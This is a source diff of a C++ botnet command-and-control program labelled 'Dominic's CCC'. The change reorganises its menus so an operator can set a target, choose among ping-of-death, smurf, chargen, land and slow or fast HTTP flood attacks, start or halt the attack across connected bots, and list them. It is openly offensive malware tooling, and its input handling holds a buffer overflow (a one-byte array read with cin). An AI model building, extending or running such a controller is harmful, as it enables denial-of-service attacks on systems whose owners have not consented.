@@ -84,14 +84,74 @@ void list_bots()
 	sleep(5);
 }
 
+void setup_attack_type()
+{
+	char char_choice[1];
+	int int_choice = 0;
+	do
+	{
+		system("clear");
+		menu_header();
+		cout << "\n";
+		cout << "Attack options: \n\n";
+		cout << "1. Ping of death attack\n";
+		cout << "2. Smurf attack\n";
+		cout << "3. Chargen attack\n";
+		cout << "4. Land attack\n";
+		cout << "5. Slow HTTP attack\n";
+		cout << "6. Fast HTTP attack\n";
+		cout << "7. exit\n";
+
+		cin >> char_choice;
+		int_choice = atoi(char_choice);
+
+		
+		switch(int_choice) 
+		{
+			case 1: 
+				attack = "POD";
+				break;
+			case 2:
+				attack = "SMURF";
+				break;
+			case 3:
+				attack = "CHARGEN";
+				break;
+			case 4:
+				attack = "LAND";
+				break;
+			case 5:
+				attack = "SLOWHTTP";
+				break;
+			case 6:
+				attack = "FASTHTTP";
+				break;
+			case 7:
+				break;
+			default:
+				cout << "Wrong choice. Enter option again.";
+				break;
+
+		}
+	} while (int_choice != 1 && int_choice != 2 && int_choice != 3 && int_choice != 4 && int_choice != 5 && int_choice != 6 && int_choice != 7);
+
+}
+
 void threaded(int i)
 {
 	char buffer[1024] = { 0 };	
 	cout << "\nClient Socket File Descriptor: " << i << "\n";
 	
 	bzero(&buffer, sizeof(buffer));
-	valread = read(i, buffer, 1024);
-        cout << "\n" << buffer;
+	int bytes = recv(i, buffer, 1024, 0);
+	// valread = read(i, buffer, 1024);
+        
+        if (bytes == 0) 
+        {
+        	close(i);
+        	return;
+        }
+        
 	while (1)
 	{
 		netbot_status bot;
@@ -194,9 +254,12 @@ void start_server()
 		menu_header();
 		cout << "\n";
 		cout << "Server options: \n\n";
-		cout << "1. start attack\n";
-		cout << "2. list connected bots\n";
-		cout << "3. exit\n";	
+		cout << "1. setup target parameters\n";
+		cout << "2. setup attack type\n";
+		cout << "3. start attack\n";
+		cout << "4. halt attack\n";
+		cout << "5. list connected bots\n";
+		cout << "6. shutdown server\n";	
 		cout << "\nServer started, waiting for client connections...\n";
 
 		cin >> char_choice;
@@ -206,12 +269,22 @@ void start_server()
 		switch(int_choice) 
 		{
 			case 1: 
-				start_attack();
+				setup_target_parameters();
 				break;
 			case 2:
+				setup_attack_type();
+				break;
+			case 3: 
+				start_attack();
+				break;
+			case 4: 
+				attack = "HALT";
+				start = true;
+				break;
+			case 5:
 				list_bots();
 				break;
-			case 3:
+			case 6:
 				shutdown(server_fd, SHUT_RDWR);
 				break;
 			default:
@@ -219,60 +292,7 @@ void start_server()
 				break;
 
 		}
-	} while (int_choice != 3);
-}
-
-void setup_attack_type()
-{
-	char char_choice[1];
-	int int_choice = 0;
-	do
-	{
-		system("clear");
-		menu_header();
-		cout << "\n";
-		cout << "Attack options: \n\n";
-		cout << "1. Ping of death attack\n";
-		cout << "2. Smurf attack\n";
-		cout << "3. Chargen attack\n";
-		cout << "4. Land attack\n";
-		cout << "5. Slow HTTP attack\n";
-		cout << "6. Fast HTTP attack\n";
-		cout << "7. exit\n";
-
-		cin >> char_choice;
-		int_choice = atoi(char_choice);
-
-		
-		switch(int_choice) 
-		{
-			case 1: 
-				attack = "POD";
-				break;
-			case 2:
-				attack = "SMURF";
-				break;
-			case 3:
-				attack = "CHARGEN";
-				break;
-			case 4:
-				attack = "LAND";
-				break;
-			case 5:
-				attack = "SLOWHTTP";
-				break;
-			case 6:
-				attack = "FASTHTTP";
-				break;
-			case 7:
-				break;
-			default:
-				cout << "Wrong choice. Enter option again.";
-				break;
-
-		}
-	} while (int_choice != 1 && int_choice != 2 && int_choice != 3 && int_choice != 4 && int_choice != 5 && int_choice != 6 && int_choice != 7);
-
+	} while (int_choice != 6);
 }
 
 void play_music(string songName)
@@ -291,39 +311,31 @@ void main_menu()
 		menu_header();
 		cout << "\n";
 		cout << "Dominic's CCC menu selection: \n\n";
-		cout << "1. setup target parameters\n";
-		cout << "2. setup attack type\n";
-		cout << "3. start server\n";
-		cout << "4. Exit\n";
+		cout << "1. start server\n";
+		cout << "2. Exit\n";
 		cin >> char_choice;
 		int_choice = atoi(char_choice);
 
 		
 		switch(int_choice) 
 		{
-			case 1: 
-				setup_target_parameters();
-				break;
-			case 2:
-				setup_attack_type();
-				break;
-			case 3:
+			case 1:
 				start_server();
 				break;
-			case 4:
+			case 2:
 				break;
 			default:
 				cout << "Wrong choice. Enter option again.";
 				break;
 
 		}
-	} while(int_choice != 4);
+	} while(int_choice != 2);
 }
 
 int main()
 {
 	// system("canberra-gtk-play -f music/music.wav");
 	main_menu();
-	cout << "Thank you for using dominic's CCC. Have a great day!";
+	cout << "\nThank you for using dominic's CCC. Have a great day!";
 	return 0;
 }
